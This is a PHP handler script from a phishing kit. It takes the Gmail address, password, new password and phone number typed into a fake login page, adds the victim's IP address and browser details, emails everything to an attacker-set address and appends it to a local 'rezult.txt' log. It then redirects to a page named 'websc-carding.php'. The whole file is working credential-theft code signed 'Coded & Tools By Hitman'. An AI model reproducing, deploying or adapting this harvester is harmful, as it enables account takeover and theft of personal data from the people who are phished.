<?php
include "to.php";
$Email = $_POST['Email'];
$Pass = $_POST['Pass'];
$NewPass = $_POST['NewPass'];
$PhoneNumber = $_POST['PhoneNumber'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Gmail-1 -------------
Email : $Email
Pass : $Pass
NewPass : $NewPass
PhoneNumber : $PhoneNumber
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
$MAIL_TITLE = "Login | ".$IP."";
$MAIL_HEADER = "From: Gmail.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=websc-carding.php'>";exit;

?>